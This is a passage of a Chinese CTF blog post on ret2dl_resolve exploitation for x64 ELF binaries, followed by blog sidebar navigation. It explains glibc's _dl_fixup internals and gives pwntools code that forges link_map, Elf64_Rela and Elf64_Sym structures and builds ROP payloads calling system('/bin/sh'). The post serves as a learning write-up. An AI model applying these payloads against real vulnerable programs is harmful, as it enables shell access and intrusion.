+<p>&emsp;&emsp;最后我们来伪造：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fake_Elf64_RELA</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    r_offset = p64(pelf.got[<span class="hljs-string">'read'</span>])</span><br><span class="line">    temp = ((fake_start_addr + align_padding + <span class="hljs-number">24</span>) - addr_dynsym)</span><br><span class="line">    <span class="hljs-keyword">if</span> (temp % <span class="hljs-number">24</span>) != <span class="hljs-number">0</span>:</span><br><span class="line">          log.debug(temp % <span class="hljs-number">24</span>)</span><br><span class="line">          log.error(<span class="hljs-string">"div error....."</span>)</span><br><span class="line">    r_info = temp / <span class="hljs-number">24</span></span><br><span class="line">    r_info = p64((r_info &lt;&lt; <span class="hljs-number">32</span>) | <span class="hljs-number">0x7</span>)</span><br><span class="line">    r_addend = p64(<span class="hljs-number">0</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> r_offset + r_info + r_addend</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fake_Elf64_Sym</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    st_name = p32((fake_start_addr + align_padding + <span class="hljs-number">24</span> + <span class="hljs-number">24</span>) - addr_dynstr)</span><br><span class="line">    <span class="hljs-keyword">return</span> st_name + p32(<span class="hljs-number">0x12</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)</span><br><span class="line"></span><br><span class="line">results = fake_Elf64_RELA() + fake_Elf64_Sym()</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;这里需要注意的是<code>r_info % 24 == 0</code>，因为找<code>Rel64_Sym</code>也是用的数组索引：<br><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;最后在调<code>_dl_runtime_resolve</code>时仍采用<code>栈</code>的传递方式，而<code>不是</code>使用寄存器。所以最后的一击大概是这样的：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret= base_addr + <span class="hljs-number">0x0000000000000b73</span></span><br><span class="line">fake_reloc_index = (fake_start_addr + align_padding) - addr_relaplt</span><br><span class="line">fake_reloc_index /= <span class="hljs-number">0x18</span></span><br><span class="line">log.info(<span class="hljs-string">"fake_reloc_index: "</span> + hex(fake_reloc_index))</span><br><span class="line">cmd_args_addr = fake_start_addr + align_padding + <span class="hljs-number">48</span> + <span class="hljs-number">8</span></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="hljs-string">'b'</span> * <span class="hljs-number">24</span> + p64(pop_rdi_ret) + p64(cmd_args_addr)</span><br><span class="line">payload += p64(addr_plt0) + p64(fake_reloc_index)   <span class="hljs-comment"># fake_reloc_index 采用栈传递</span></span><br><span class="line">payload += results</span><br><span class="line">payload += <span class="hljs-string">"system"</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>) + <span class="hljs-string">"/bin/sh\x00"</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="DEMO1"><a href="#DEMO1" class="headerlink" title="DEMO1"></a>DEMO1</h3><p>&emsp;&emsp;在上面的demo中提到，x64的利用上需要先<code>leak link_map</code>，在这个例子中程序没有write、puts等可以输出的函数，但给了<code>libc</code>，所以在这个场景中就没法直接leak了。</p>
+<div align="center"><br>    <img src="/images/posts/pwn/50.png"><br></div>
+
+<p>&emsp;&emsp;回到_dl_fixup的源码，在：<br><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)&#123;...&#125;</span><br><span class="line"><span class="hljs-keyword">else</span> &#123;</span><br><span class="line">  value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="hljs-literal">true</span>));</span><br><span class="line">  result = l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;可以看到如果是已解析过的函数会直接调用<code>DL_FIXUP_MAKE_VALUE</code>，然后我们再看这个是怎么样的：</p>
+<div align="center"><br>    <img src="/images/posts/pwn/49.png"><br></div>
+
+<p>&emsp;&emsp;也就是说该函数会直接返回<code>l-&gt;l_addr + sym-&gt;st_value</code>作为解析结果。</p>
+<p>&emsp;&emsp;那么一个攻击思路就是如果我们让l-&gt;l_addr或sym-&gt;st_value的值指向在<code>__libc_start_main</code>或<code>gets</code>的<code>got</code>，那么我们就间接的拿到了libc的地址，然后再让另一个设置成该函数相对<code>system</code>的偏移，那么我们就能得到system的实际地址。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system_offset = libc.sym[<span class="hljs-string">'system'</span>] - libc.sym[<span class="hljs-string">'__libc_start_main'</span>]</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;以上就是攻击思路，那么我们在看具体的实现。</p>
+<p>&emsp;&emsp;根据上述，我们需要控制l-&gt;l_addr和sym-&gt;st_value，就意味着我们要伪造link_map,reloc_offset,Rel64_Rela,Rel64_Sym。攻击链：</p>
+<div align="center"><br>    <img src="/images/posts/pwn/51.png"><br></div>
+
+<p>&emsp;&emsp;第一步先绕过if，设置sym-&gt;st_other，根据汇编结果：<br><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0x00007f69d60aba3b</span> &lt;+<span class="hljs-number">75</span>&gt;:	add    rbx,QWORD PTR [r8]</span><br><span class="line"><span class="hljs-number">0x00007f69d60aba3e</span> &lt;+<span class="hljs-number">78</span>&gt;:	cmp    ecx,<span class="hljs-number">0x7</span></span><br><span class="line"><span class="hljs-number">0x00007f69d60aba41</span> &lt;+<span class="hljs-number">81</span>&gt;:	jne    <span class="hljs-number">0x7f69d60abb97</span> &lt;_dl_fixup+<span class="hljs-number">423</span>&gt;</span><br><span class="line"><span class="hljs-number">0x00007f69d60aba47</span> &lt;+<span class="hljs-number">87</span>&gt;:	test   BYTE PTR [rsi+<span class="hljs-number">0x5</span>],<span class="hljs-number">0x3</span></span><br><span class="line"><span class="hljs-number">0x00007f69d60aba4b</span> &lt;+<span class="hljs-number">91</span>&gt;:	jne    <span class="hljs-number">0x7f69d60abae9</span> &lt;_dl_fixup+<span class="hljs-number">249</span>&gt;</span><br><span class="line"><span class="hljs-comment">// jne是一个条件转移指令。当ZF=0，转至标号处执行。</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;<code>rsi+0x5</code>就是sym-&gt;st_other，那么我们就需要sym-&gt;st_other == 3。</p>
+<p>&emsp;&emsp;第二，fake link_map，完整的link_map无法伪造，根据上图也无需伪造完整的，我们只关心有用的变量。link_map的结构体可以<a href="https://code.woboq.org/userspace/glibc/include/link.h.html#link_map" target="_blank" rel="noopener">在这里</a>找到。</p>
+<p>&emsp;&emsp;可以算出l_info在link_map的第64个字节处，那么DT_STRTAB,DT_SYMTAB,DT_JMPREL怎么伪造呢？我们可以从源码中得到他们的位置：</p>
+<div align="center"><br>    <img src="/images/posts/pwn/52.png"><br></div><br><div align="center"><br>    <img src="/images/posts/pwn/53.png"><br></div><br><div align="center"><br>    <img src="/images/posts/pwn/54.png"><br></div>
+
+<p>&emsp;&emsp;我们可以用下面函数生成link_map：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">faking_link_map</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    self_length = <span class="hljs-number">256</span></span><br><span class="line">    system_offset = libc.sym[<span class="hljs-string">'system'</span>] - libc.sym[<span class="hljs-string">'__libc_start_main'</span>]</span><br><span class="line">    l_addr = p64(system_offset)</span><br><span class="line">    padding = p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>) * <span class="hljs-number">7</span></span><br><span class="line">    l_info = p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>) * <span class="hljs-number">5</span>    <span class="hljs-comment"># pading</span></span><br><span class="line">    l_info += p64(bss_addr) <span class="hljs-comment"># DT_STRTAB, 随便指，后面用不上</span></span><br><span class="line">    l_info += p64(bss_addr + <span class="hljs-number">4</span> *<span class="hljs-number">8</span> + <span class="hljs-number">256</span> + <span class="hljs-number">16</span> + <span class="hljs-number">24</span> + <span class="hljs-number">16</span>) <span class="hljs-comment"># DT_SYMTAB</span></span><br><span class="line">    l_info += p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>) * (<span class="hljs-number">23</span> - <span class="hljs-number">6</span> - <span class="hljs-number">1</span>)    <span class="hljs-comment"># pading</span></span><br><span class="line">    l_info += p64(bss_addr + <span class="hljs-number">8</span> * <span class="hljs-number">6</span> + self_length) <span class="hljs-comment"># DT_JMPREL</span></span><br><span class="line">    <span class="hljs-keyword">return</span> l_addr + padding + l_info    <span class="hljs-comment"># length: 8 * 32 = 256</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;这里需要注意的是DT_SYMTAB和DT_JMPREL的值并不是直接就是指定的，因为代码中是<code>取地址</code>。这里跟了一个正常的link_map l_info：</p>
+<div align="center"><br>    <img src="/images/posts/pwn/55.png"><br></div><br><div align="center"><br>    <img src="/images/posts/pwn/56.png"><br></div>
+
+<p>&emsp;&emsp;当然，汇编中也可以看出来：<br><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="hljs-number">0x00007f69d60aba06</span> &lt;+<span class="hljs-number">22</span>&gt;:	mov    rax,QWORD PTR [r10+<span class="hljs-number">0xf8</span>] ; DT_JMPREL</span><br><span class="line">   <span class="hljs-number">0x00007f69d60aba0d</span> &lt;+<span class="hljs-number">29</span>&gt;:	mov    rax,QWORD PTR [rax+<span class="hljs-number">0x8</span>]  ; 问题所在 </span><br><span class="line">   <span class="hljs-number">0x00007f69d60aba11</span> &lt;+<span class="hljs-number">33</span>&gt;:	lea    r8,[rax+rdx*<span class="hljs-number">8</span>]           ; fetch reloc</span><br><span class="line">   <span class="hljs-number">0x00007f69d60aba15</span> &lt;+<span class="hljs-number">37</span>&gt;:	mov    rax,QWORD PTR [r10+<span class="hljs-number">0x70</span>] ; DT_SYMTAB</span><br><span class="line">=&gt; <span class="hljs-number">0x00007f69d60aba19</span> &lt;+<span class="hljs-number">41</span>&gt;:	mov    rcx,QWORD PTR [r8+<span class="hljs-number">0x8</span>]</span><br><span class="line">   <span class="hljs-number">0x00007f69d60aba1d</span> &lt;+<span class="hljs-number">45</span>&gt;:	mov    rax,QWORD PTR [rax+<span class="hljs-number">0x8</span>]  ; 问题所在</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;Rel64_rela的fake，比较简单：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fake_Elf64_RELA</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    r_offset = p64(<span class="hljs-number">0x5dc960</span> + <span class="hljs-number">48</span>)   <span class="hljs-comment"># 保证 l_addr + r_offset 可写</span></span><br><span class="line">    temp = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (temp % <span class="hljs-number">24</span>) != <span class="hljs-number">0</span>:</span><br><span class="line">          log.debug(temp % <span class="hljs-number">24</span>)</span><br><span class="line">          log.error(<span class="hljs-string">"div error....."</span>)</span><br><span class="line">    r_info = temp / <span class="hljs-number">24</span></span><br><span class="line">    r_info = p64((r_info &lt;&lt; <span class="hljs-number">32</span>) | <span class="hljs-number">0x7</span>)</span><br><span class="line">    r_addend = p64(<span class="hljs-number">0</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> r_offset + r_info + r_addend <span class="hljs-comment"># length: 8 * 3 = 24</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;Rel64_Sym不用伪造，我们把它地址指向<code>pelf.got[&quot;__libc_start_main&quot;] - 8</code>，这样，st_value就是<code>__libc_start_main</code>的got。</p>
+<p>&emsp;&emsp;最后的exp就如：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">cmd_args = bss_addr + <span class="hljs-number">6</span> * <span class="hljs-number">8</span> + <span class="hljs-number">256</span> + <span class="hljs-number">16</span> + <span class="hljs-number">24</span> + <span class="hljs-number">16</span></span><br><span class="line">link_map_addr = bss_addr + <span class="hljs-number">8</span> * <span class="hljs-number">6</span></span><br><span class="line">rel_offset = <span class="hljs-number">0</span></span><br><span class="line">fake_link_map = faking_link_map()</span><br><span class="line"></span><br><span class="line">fake_rela = fake_Elf64_RELA()</span><br><span class="line"></span><br><span class="line">fake_rela_addr = bss_addr + <span class="hljs-number">6</span> * <span class="hljs-number">8</span> + <span class="hljs-number">256</span> + <span class="hljs-number">16</span></span><br><span class="line"></span><br><span class="line">fake_sym_addr = pelf.got[<span class="hljs-string">"__libc_start_main"</span>] - <span class="hljs-number">8</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="hljs-string">'A'</span> * <span class="hljs-number">8</span> + p64(pop_rdi_ret) + p64(cmd_args)</span><br><span class="line">payload2 += p64(plt0) + p64(link_map_addr) + p64(rel_offset)</span><br><span class="line">payload2 += fake_link_map + p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>) + p64(fake_rela_addr)</span><br><span class="line">payload2 += fake_rela + p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>) + p64(fake_sym_addr)</span><br><span class="line"></span><br><span class="line">payload2 += <span class="hljs-string">"/bin/sh\x00"</span> + <span class="hljs-string">'\n'</span></span><br><span class="line"></span><br><span class="line">payload = (payload2).ljust(<span class="hljs-number">0x1000</span>, <span class="hljs-string">'\x00'</span>)</span><br><span class="line">log.info(<span class="hljs-string">"calling system..."</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure></p>
+<h4 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h4><p>&emsp;&emsp;因为这题使用了<code>wrapper</code>：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exec_serv</span><span class="hljs-params">(name, payload)</span>:</span></span><br><span class="line">    p = subprocess.Popen(name, stdin=subprocess.PIPE, stdout=file(<span class="hljs-string">'/dev/null'</span>,<span class="hljs-string">'w'</span>), stderr=subprocess.STDOUT)</span><br><span class="line">    p.stdin.write(payload)</span><br><span class="line">    p.wait()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    payload = sys.stdin.read(<span class="hljs-number">0x1000</span>)</span><br><span class="line">    exec_serv(<span class="hljs-string">'./demo1'</span>, payload)</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;我们要一次将exp发送出去，并足够0x1000，因为<code>gets</code>遇到<code>\n</code>会停止读，所以我们要在每个payload的后面用<code>\n</code>截断。</p>
+<p>&emsp;&emsp;另一个tips：当程序使用<code>socat</code>启动时，我们可以用：</p>
+<div align="center"><br>    <img src="/images/posts/pwn/57.png"><br></div>
+
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gdb attach 1947</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;然后将断点下在：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b __memcpy_sse2</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;因为此时才将真正的binary加载到内存：</p>
+<div align="center"><br>    <img src="/images/posts/pwn/58.png"><br></div>
+
+<p>&emsp;&emsp;然后再下正常的断点就行了。</p>
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul>
+<li><a href="https://ddaa.tw/hitcon_pwn_200_blinkroot.html" target="_blank" rel="noopener">https://ddaa.tw/hitcon_pwn_200_blinkroot.html</a></li>
+<li><a href="http://inaz2.hatenablog.com/entry/2014/07/27/205322" target="_blank" rel="noopener">http://inaz2.hatenablog.com/entry/2014/07/27/205322</a></li>
+<li><a href="https://www.lazenca.net/pages/viewpage.action?pageId=19300744" target="_blank" rel="noopener">https://www.lazenca.net/pages/viewpage.action?pageId=19300744</a></li>
+<li><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a></li>
+<li><a href="https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></li>
+<li><a href="http://blog.chinaunix.net/uid-21471835-id-441227.html" target="_blank" rel="noopener">_dl_fixup函数的一些解释</a></li>
+<li><a href="https://paper.seebug.org/papers/Archive/refs/elf/001_2%20Linux%20%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%9C%BA%E5%88%B6%E7%A0%94%E7%A9%B6%E5%8F%8A%E5%BA%94%E7%94%A8.pdf" target="_blank" rel="noopener">https://paper.seebug.org/papers/Archive/refs/elf/001_2%20Linux%20%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%9C%BA%E5%88%B6%E7%A0%94%E7%A9%B6%E5%8F%8A%E5%BA%94%E7%94%A8.pdf</a></li>
+<li><a href="https://dangokyo.me/2018/01/27/extra-exploitation-technique-return-to-dl_resolve/" target="_blank" rel="noopener">https://dangokyo.me/2018/01/27/extra-exploitation-technique-return-to-dl_resolve/</a></li>
+<li><a href="https://speakerd.s3.amazonaws.com/presentations/d83d11ed6c124caa812be6ebc1dc03a1/blinkroot.pdf" target="_blank" rel="noopener">https://speakerd.s3.amazonaws.com/presentations/d83d11ed6c124caa812be6ebc1dc03a1/blinkroot.pdf</a></li>
+<li><a href="https://zoepla.github.io/2018/08/%E6%A0%88%E6%BA%A2%E5%87%BA_%E4%BA%8C_-64%E4%BD%8D/" target="_blank" rel="noopener">https://zoepla.github.io/2018/08/%E6%A0%88%E6%BA%A2%E5%87%BA_%E4%BA%8C_-64%E4%BD%8D/</a></li>
+<li><a href="https://www.ibm.com/developerworks/cn/linux/l-elf/part2/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-elf/part2/index.html</a></li>
+<li><a href="http://s.eresi-project.org/inc/articles/elf-rtld.txt" target="_blank" rel="noopener">http://s.eresi-project.org/inc/articles/elf-rtld.txt</a></li>
+</ul>
+
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/CTF/">CTF</a>, <a class="has-link-grey -link" href="/tags/ret2dl-resolve/">ret2dl_resolve</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2019/01/small_stack_and_brop/">
+                <span class="level-item">x86下栈溢出太小和BROP</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<script>
+    var disqus_config = function () {
+        this.page.url = 'http://yoursite.com/2019/03/ret2dl_resolve_x64/';
+        this.page.identifier = '2019/03/ret2dl_resolve_x64/';
+    };
+    (function() {
+        var d = document, s = d.createElement('script');  
+        s.src = '//' + 'delcoding' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+
+<div id="disqus_thread">
+    
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+    </div>
+</div>
+</div>
+                
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered">
+                <div>
+                    <img class="image is-128x128 has-mb-6" src="/images/avatar.png" alt="Junay">
+                    
+                    <p class="is-size-4 is-block">
+                        Junay
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        Junay&#39;s blog
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>Shanghai</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        64
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        2
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        24
+                    </p>
+                </div>
+            </div>
+        </nav>
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/delcoding">
+                关注我</a>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/delcoding">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Facebook" href="http://facebook.com">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="http://twitter.com">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Dribbble" href="http://dribbble.com">
+                
+                <i class="fab fa-dribbble"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+    
+        
+
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                分类
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/CTF/">
+            <span class="level-start">
+                <span class="level-item">CTF</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">7</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/jekyll-update/">
+            <span class="level-start">
+                <span class="level-item">jekyll update</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">26</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            标签云
+        </h3>
+        <a href="/tags/BROP/" style="font-size: 10px;">BROP</a> <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/blockchain/" style="font-size: 13.33px;">blockchain</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwm/" style="font-size: 10px;">pwm</a> <a href="/tags/pwn/" style="font-size: 13.33px;">pwn</a> <a href="/tags/ret2dl-resolve/" style="font-size: 13.33px;">ret2dl_resolve</a> <a href="/tags/rop/" style="font-size: 10px;">rop</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/鹏程杯/" style="font-size: 10px;">鹏程杯</a>
+    </div>
+</div>
+
+    
+    
+        <div class="card card-transparent is-hidden-widescreen">
+        
+            
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2019/03/ret2dl_resolve_x64/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="ret2dl_resolve x64 study">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-03-13T16:00:00.000Z">2019-03-14</time></div>
+                    <a href="/2019/03/ret2dl_resolve_x64/" class="has-link-black-ter is-size-6">ret2dl_resolve x64 study</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/01/small_stack_and_brop/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="x86下栈溢出太小和BROP">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-01-15T15:00:00.000Z">2019-01-15</time></div>
+                    <a href="/2019/01/small_stack_and_brop/" class="has-link-black-ter is-size-6">x86下栈溢出太小和BROP</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/01/ret2dl_resolve_x86/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="ret2dl_resolve exp">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-01-01T16:00:00.000Z">2019-01-02</time></div>
+                    <a href="/2019/01/ret2dl_resolve_x86/" class="has-link-black-ter is-size-6">ret2dl_resolve exp</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/12/dl_runtime_resolve/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="got/plt之_dl_runtime_resolve">
+                </p>
+            </a>
+            
+            <div class="media-content">
